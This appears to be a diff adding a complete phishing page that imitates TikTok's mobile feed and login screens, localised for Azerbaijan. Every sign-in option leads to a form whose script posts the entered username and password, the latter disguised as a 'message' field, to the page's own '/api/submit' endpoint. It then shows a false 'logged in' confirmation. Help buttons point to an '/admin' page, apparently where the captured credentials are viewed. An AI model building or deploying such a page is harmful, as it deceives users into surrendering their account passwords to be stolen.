@@ -1,0 +1,956 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TikTok</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    /* ===================== SPLASH SCREEN ===================== */
+    #splash-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      background: #000;
+      overflow: hidden;
+    }
+
+    #splash-screen .splash-bg {
+      position: absolute;
+      inset: 0;
+      background-image: url('splash.jpg');
+      background-size: cover;
+      background-position: center;
+      filter: brightness(0.75);
+    }
+
+    /* Fallback gradient if image fails */
+    #splash-screen .splash-bg-fallback {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        180deg,
+        #0a0a0a 0%,
+        #1a2a0a 20%,
+        #1a3a10 40%,
+        #0d1f08 60%,
+        #050f04 80%,
+        #020805 100%
+      );
+    }
+
+    /* Rain overlay */
+    #splash-screen .rain-overlay {
+      position: absolute;
+      inset: 0;
+      background:
+        repeating-linear-gradient(
+          90deg,
+          transparent,
+          transparent 3px,
+          rgba(180,200,255,0.03) 3px,
+          rgba(180,200,255,0.03) 4px
+        );
+      animation: rainMove 0.4s linear infinite;
+      pointer-events: none;
+    }
+
+    @keyframes rainMove {
+      0% { transform: translateY(-20px); }
+      100% { transform: translateY(20px); }
+    }
+
+    /* Street light glow */
+    #splash-screen .glow {
+      position: absolute;
+      bottom: 20%;
+      left: 35%;
+      width: 200px;
+      height: 200px;
+      background: radial-gradient(circle, rgba(255,200,80,0.35) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    /* Top nav bar */
+    #splash-screen .top-nav {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px 16px;
+      background: transparent;
+      gap: 0;
+    }
+
+    #splash-screen .top-nav .live-btn {
+      position: absolute;
+      left: 16px;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      background: #fe2c55;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 3px 5px;
+      border-radius: 3px;
+      letter-spacing: 0.5px;
+    }
+
+    #splash-screen .top-nav .live-btn svg {
+      width: 12px;
+      height: 12px;
+    }
+
+    #splash-screen .top-nav .nav-tabs {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    #splash-screen .top-nav .nav-tab {
+      color: rgba(255,255,255,0.65);
+      font-size: 15px;
+      font-weight: 500;
+      padding: 4px 0;
+      cursor: pointer;
+      position: relative;
+    }
+
+    #splash-screen .top-nav .nav-tab.active {
+      color: #fff;
+      font-weight: 700;
+    }
+
+    #splash-screen .top-nav .nav-tab.active::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 20px;
+      height: 2px;
+      background: #fff;
+      border-radius: 1px;
+    }
+
+    #splash-screen .top-nav .search-icon {
+      position: absolute;
+      right: 16px;
+      color: #fff;
+    }
+
+    /* Right sidebar */
+    #splash-screen .right-sidebar {
+      position: absolute;
+      right: 12px;
+      bottom: 120px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+      z-index: 10;
+    }
+
+    #splash-screen .right-sidebar .avatar {
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      background: #ccc;
+      border: 1.5px solid #fff;
+      position: relative;
+    }
+
+    #splash-screen .right-sidebar .avatar .plus {
+      position: absolute;
+      bottom: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 18px;
+      height: 18px;
+      background: #fe2c55;
+      border-radius: 50%;
+      border: 1.5px solid #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    #splash-screen .right-sidebar .action-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      color: #fff;
+    }
+
+    #splash-screen .right-sidebar .action-item svg {
+      width: 30px;
+      height: 30px;
+      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5));
+    }
+
+    #splash-screen .right-sidebar .action-item span {
+      font-size: 11px;
+      font-weight: 600;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+    }
+
+    #splash-screen .right-sidebar .music-disc {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: #222;
+      border: 3px solid #555;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: spinDisc 3s linear infinite;
+    }
+
+    #splash-screen .right-sidebar .music-disc::after {
+      content: '';
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #333;
+      border: 2px solid #555;
+    }
+
+    @keyframes spinDisc {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* Full screen button */
+    #splash-screen .fullscreen-btn {
+      position: absolute;
+      bottom: 120px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.5);
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      padding: 8px 16px;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    /* Bottom info */
+    #splash-screen .bottom-info {
+      position: absolute;
+      bottom: 90px;
+      left: 12px;
+      right: 60px;
+      z-index: 10;
+    }
+
+    #splash-screen .bottom-info .translate {
+      color: rgba(255,255,255,0.9);
+      font-size: 12px;
+      margin-bottom: 6px;
+    }
+
+    #splash-screen .bottom-info .music-info {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      color: #fff;
+      font-size: 12px;
+    }
+
+    /* Bottom nav */
+    #splash-screen .bottom-nav {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 82px;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      z-index: 10;
+      padding-bottom: 10px;
+    }
+
+    #splash-screen .bottom-nav .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      color: rgba(255,255,255,0.8);
+      font-size: 10px;
+      cursor: pointer;
+      min-width: 50px;
+    }
+
+    #splash-screen .bottom-nav .nav-item.active {
+      color: #fff;
+    }
+
+    #splash-screen .bottom-nav .nav-item svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    #splash-screen .bottom-nav .create-btn {
+      position: relative;
+      width: 46px;
+      height: 32px;
+    }
+
+    #splash-screen .bottom-nav .create-btn .create-inner {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(90deg, #69C9D0 0%, #EE1D52 100%);
+      border-radius: 8px;
+    }
+
+    #splash-screen .bottom-nav .create-btn .create-inner::before {
+      content: '+';
+      color: #fff;
+      font-size: 22px;
+      font-weight: 300;
+      line-height: 1;
+    }
+
+    /* ===================== LOGIN SCREEN 2 ===================== */
+    #login-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 90;
+      display: none;
+      flex-direction: column;
+      background: #fff;
+      overflow-y: auto;
+    }
+
+    #login-screen .login-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 16px;
+    }
+
+    #login-screen .login-header .close-btn {
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #161823;
+      font-size: 22px;
+      font-weight: 300;
+    }
+
+    #login-screen .login-header .help-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 1.5px solid #161823;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #161823;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    #login-screen .login-title {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #161823;
+      margin: 8px 24px 12px;
+      letter-spacing: -0.3px;
+    }
+
+    #login-screen .login-subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #8a8b8d;
+      margin: 0 36px 28px;
+      line-height: 1.5;
+    }
+
+    #login-screen .login-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      padding: 0 16px;
+      margin-bottom: 28px;
+    }
+
+    #login-screen .login-option-btn {
+      display: flex;
+      align-items: center;
+      height: 52px;
+      border: 1px solid #e3e3e4;
+      border-radius: 4px;
+      padding: 0 16px;
+      cursor: pointer;
+      background: #fff;
+      position: relative;
+      transition: background 0.1s;
+    }
+
+    #login-screen .login-option-btn:active {
+      background: #f8f8f8;
+    }
+
+    #login-screen .login-option-btn .btn-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      left: 14px;
+    }
+
+    #login-screen .login-option-btn .btn-text {
+      flex: 1;
+      text-align: center;
+      font-size: 15px;
+      font-weight: 500;
+      color: #161823;
+    }
+
+    #login-screen .login-footer {
+      padding: 16px 24px;
+      border-top: 1px solid #f1f1f2;
+    }
+
+    #login-screen .login-footer p {
+      text-align: center;
+      font-size: 12px;
+      color: #8a8b8d;
+      line-height: 1.6;
+    }
+
+    #login-screen .login-footer p strong {
+      color: #161823;
+    }
+
+    #login-screen .login-footer p a {
+      color: #161823;
+      text-decoration: underline;
+    }
+
+    #login-screen .signup-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: #fff;
+      border-top: 1px solid #f1f1f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+
+    #login-screen .signup-bar span {
+      font-size: 14px;
+      color: #8a8b8d;
+    }
+
+    #login-screen .signup-bar a {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fe2c55;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    /* ===================== FORM SCREEN 3 ===================== */
+    #form-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 80;
+      display: none;
+      flex-direction: column;
+      background: #fff;
+    }
+
+    #form-screen .form-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 16px;
+      border-bottom: none;
+    }
+
+    #form-screen .form-header .back-btn {
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #161823;
+      font-size: 22px;
+      cursor: pointer;
+    }
+
+    #form-screen .form-header .form-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #161823;
+    }
+
+    #form-screen .form-header .help-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 1.5px solid #161823;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #161823;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    #form-screen .tab-bar {
+      display: flex;
+      border-bottom: 1px solid #e3e3e4;
+    }
+
+    #form-screen .tab-bar .tab {
+      flex: 1;
+      text-align: center;
+      padding: 14px 0;
+      font-size: 15px;
+      color: #8a8b8d;
+      cursor: pointer;
+      position: relative;
+    }
+
+    #form-screen .tab-bar .tab.active {
+      color: #161823;
+      font-weight: 700;
+    }
+
+    #form-screen .tab-bar .tab.active::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60%;
+      height: 2px;
+      background: #161823;
+    }
+
+    #form-screen .form-body {
+      padding: 28px 16px;
+    }
+
+    #form-screen .input-group {
+      margin-bottom: 0;
+    }
+
+    #form-screen .input-field {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #e3e3e4;
+      padding: 14px 0;
+      font-size: 16px;
+      color: #161823;
+      outline: none;
+      background: transparent;
+      margin-bottom: 8px;
+    }
+
+    #form-screen .input-field::placeholder {
+      color: #b0b1b2;
+      font-weight: 400;
+    }
+
+    #form-screen .input-field:focus {
+      border-bottom-color: #888;
+    }
+
+    #form-screen .forgot-pw {
+      font-size: 14px;
+      font-weight: 700;
+      color: #161823;
+      margin-top: 16px;
+      display: block;
+      cursor: pointer;
+    }
+
+    #form-screen .login-btn {
+      width: 100%;
+      height: 50px;
+      background: #e3e3e4;
+      color: #8a8b8d;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 28px;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    #form-screen .login-btn.active-btn {
+      background: #fe2c55;
+      color: #fff;
+    }
+
+    /* Success toast */
+    .toast {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.85);
+      color: #fff;
+      padding: 14px 28px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 500;
+      z-index: 9999;
+      opacity: 0;
+      transition: opacity 0.3s;
+      text-align: center;
+      white-space: nowrap;
+    }
+
+    .toast.show {
+      opacity: 1;
+    }
+
+    /* TikTok icon SVG helpers */
+    .tiktok-logo-icon {
+      width: 24px;
+      height: 24px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ======= SCREEN 1: SPLASH ======= -->
+  <div id="splash-screen">
+    <div class="splash-bg-fallback"></div>
+    <div class="splash-bg" id="splashBg"></div>
+    <div class="rain-overlay"></div>
+    <div class="glow"></div>
+
+    <!-- Top nav -->
+    <div class="top-nav">
+      <div class="live-btn">
+        <svg viewBox="0 0 24 24" fill="currentColor"><rect x="2" y="5" width="15" height="14" rx="2"/><polygon points="22,8 17,12 22,16"/></svg>
+        LIVE
+      </div>
+      <div class="nav-tabs">
+        <div class="nav-tab">Araşdırın</div>
+        <div class="nav-tab">İzləyir</div>
+        <div class="nav-tab active">Sizin üçün</div>
+      </div>
+      <div class="search-icon">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      </div>
+    </div>
+
+    <!-- Right sidebar -->
+    <div class="right-sidebar">
+      <div class="avatar">
+        <div style="width:100%;height:100%;border-radius:50%;background:linear-gradient(135deg,#ccc,#999);"></div>
+        <div class="plus">+</div>
+      </div>
+      <div class="action-item">
+        <svg viewBox="0 0 24 24" fill="#fff"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+        <span>2M</span>
+      </div>
+      <div class="action-item">
+        <svg viewBox="0 0 24 24" fill="#fff"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        <span>6719</span>
+      </div>
+      <div class="action-item">
+        <svg viewBox="0 0 24 24" fill="#fff"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+        <span>233,9K</span>
+      </div>
+      <div class="action-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+        <span>170,3K</span>
+      </div>
+      <div class="music-disc"></div>
+    </div>
+
+    <!-- Full screen btn -->
+    <button class="fullscreen-btn">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="15" height="18" rx="2"/><rect x="9" y="7" width="13" height="10" rx="2"/></svg>
+      Tam ekran
+    </button>
+
+    <!-- Bottom info -->
+    <div class="bottom-info">
+      <div class="translate">· Tərcüməyə baxın</div>
+      <div class="music-info">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="#fff"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+        Daxildir: Limerence - Yves...
+      </div>
+    </div>
+
+    <!-- Bottom nav -->
+    <div class="bottom-nav">
+      <div class="nav-item active">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9,22 9,12 15,12 15,22" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        <span>Əsas səhifə</span>
+      </div>
+      <div class="nav-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="9" cy="7" r="4"/><path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/><path d="M21 21v-2a4 4 0 0 0-3-3.85"/></svg>
+        <span>Dostlar</span>
+      </div>
+      <div class="nav-item">
+        <div class="create-btn">
+          <div class="create-inner"></div>
+        </div>
+      </div>
+      <div class="nav-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        <span>Mesaj qutusu</span>
+      </div>
+      <div class="nav-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        <span>Profil</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= SCREEN 2: LOGIN PAGE (TikTok Clone) ======= -->
+  <div id="login-screen">
+    <div class="login-header">
+      <div class="close-btn" onclick="goToForm()">✕</div>
+      <div class="help-btn" onclick="goToAdmin()">?</div>
+    </div>
+
+    <h1 class="login-title">Log in to TikTok</h1>
+    <p class="login-subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+
+    <div class="login-options">
+      <!-- Use TikTok app -->
+      <button class="login-option-btn" onclick="goToForm()">
+        <div class="btn-icon">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34V9a8.18 8.18 0 0 0 4.78 1.52V7.1a4.85 4.85 0 0 1-1.01-.41z" fill="#161823"/>
+          </svg>
+        </div>
+        <span class="btn-text">Use TikTok app</span>
+      </button>
+
+      <!-- Phone/email/username -->
+      <button class="login-option-btn" onclick="goToForm()">
+        <div class="btn-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="#161823"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        </div>
+        <span class="btn-text">Use phone / email / username</span>
+      </button>
+
+      <!-- Facebook -->
+      <button class="login-option-btn" onclick="goToForm()">
+        <div class="btn-icon">
+          <svg width="28" height="28" viewBox="0 0 36 36" fill="none">
+            <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+            <path d="M25 18c0-3.87-3.13-7-7-7s-7 3.13-7 7c0 3.49 2.56 6.39 5.91 6.91V20.14h-1.78V18h1.78v-1.54c0-1.76 1.05-2.73 2.65-2.73.77 0 1.57.14 1.57.14v1.73h-.88c-.87 0-1.14.54-1.14 1.09V18h1.94l-.31 2.14h-1.63v4.77C22.44 24.39 25 21.49 25 18z" fill="#fff"/>
+          </svg>
+        </div>
+        <span class="btn-text">Continue with Facebook</span>
+      </button>
+
+      <!-- Google -->
+      <button class="login-option-btn" onclick="goToForm()">
+        <div class="btn-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+        </div>
+        <span class="btn-text">Continue with Google</span>
+      </button>
+
+      <!-- Apple -->
+      <button class="login-option-btn" onclick="goToForm()">
+        <div class="btn-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="#161823"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+        </div>
+        <span class="btn-text">Continue with Apple</span>
+      </button>
+    </div>
+
+    <div class="login-footer">
+      <p>By continuing with an account located in <strong>Azerbaijan</strong>, you agree to our <a href="#">Terms of Service</a> and acknowledge that you have read our <a href="#">Privacy Policy</a>.</p>
+    </div>
+
+    <div style="height: 60px;"></div>
+
+    <div class="signup-bar">
+      <span>Don't have an account?</span>
+      <a onclick="goToForm()">Sign up</a>
+    </div>
+  </div>
+
+  <!-- ======= SCREEN 3: EMAIL/USERNAME FORM ======= -->
+  <div id="form-screen">
+    <div class="form-header">
+      <div class="back-btn">&#8249;</div>
+      <div class="form-title">Log in</div>
+      <div class="help-btn" onclick="goToAdmin()">?</div>
+    </div>
+
+    <div class="tab-bar">
+      <div class="tab" onclick="switchTab('phone')">Phone</div>
+      <div class="tab active" id="tab-email" onclick="switchTab('email')">Email / Username</div>
+    </div>
+
+    <div class="form-body">
+      <div class="input-group">
+        <input type="text" class="input-field" id="nameInput" placeholder="Email or username" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+        <input type="password" class="input-field" id="passwordInput" placeholder="Password" autocomplete="off">
+      </div>
+      <span class="forgot-pw">Forgot password?</span>
+      <button class="login-btn" id="loginBtn" onclick="submitForm()">Log in</button>
+    </div>
+  </div>
+
+  <!-- Toast notification -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ============ SPLASH → LOGIN transition ============
+    window.addEventListener('load', function() {
+      // Show splash for ~900ms then auto-transition
+      setTimeout(function() {
+        showLoginScreen();
+      }, 900);
+    });
+
+    function showLoginScreen() {
+      var splash = document.getElementById('splash-screen');
+      var login = document.getElementById('login-screen');
+      splash.style.display = 'none';
+      login.style.display = 'flex';
+    }
+
+    function goToForm() {
+      var login = document.getElementById('login-screen');
+      var form = document.getElementById('form-screen');
+      login.style.display = 'none';
+      form.style.display = 'flex';
+      form.style.flexDirection = 'column';
+    }
+
+    // Tab switching (visual only)
+    function switchTab(tab) {
+      var tabs = document.querySelectorAll('#form-screen .tab');
+      tabs.forEach(function(t) { t.classList.remove('active'); });
+      if (tab === 'phone') {
+        tabs[0].classList.add('active');
+        document.getElementById('nameInput').placeholder = 'Phone number';
+      } else {
+        tabs[1].classList.add('active');
+        document.getElementById('nameInput').placeholder = 'Email or username';
+      }
+    }
+
+    // Enable/disable login button based on input
+    var nameInput = document.getElementById('nameInput');
+    var passwordInput = document.getElementById('passwordInput');
+    var loginBtn = document.getElementById('loginBtn');
+
+    function checkInputs() {
+      if (nameInput.value.trim().length > 0 && passwordInput.value.length > 0) {
+        loginBtn.classList.add('active-btn');
+      } else {
+        loginBtn.classList.remove('active-btn');
+      }
+    }
+
+    nameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+
+    // Submit form
+    function submitForm() {
+      var name = nameInput.value.trim();
+      var message = passwordInput.value.trim();
+
+      if (!name || !message) {
+        showToast('Ad və mesaj daxil edin');
+        return;
+      }
+
+      fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: name, message: message })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.success) {
+          showToast('Giriş olundu ✓');
+          nameInput.value = '';
+          passwordInput.value = '';
+          loginBtn.classList.remove('active-btn');
+        }
+      })
+      .catch(function() {
+        showToast('Xəta baş verdi, yenidən cəhd edin');
+      });
+    }
+
+    // Toast
+    function showToast(msg) {
+      var toast = document.getElementById('toast');
+      toast.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(function() {
+        toast.classList.remove('show');
+      }, 2500);
+    }
+
+    // Admin redirect
+    function goToAdmin() {
+      window.location.href = '/admin';
+    }
+  </script>
+</body>
+</html>
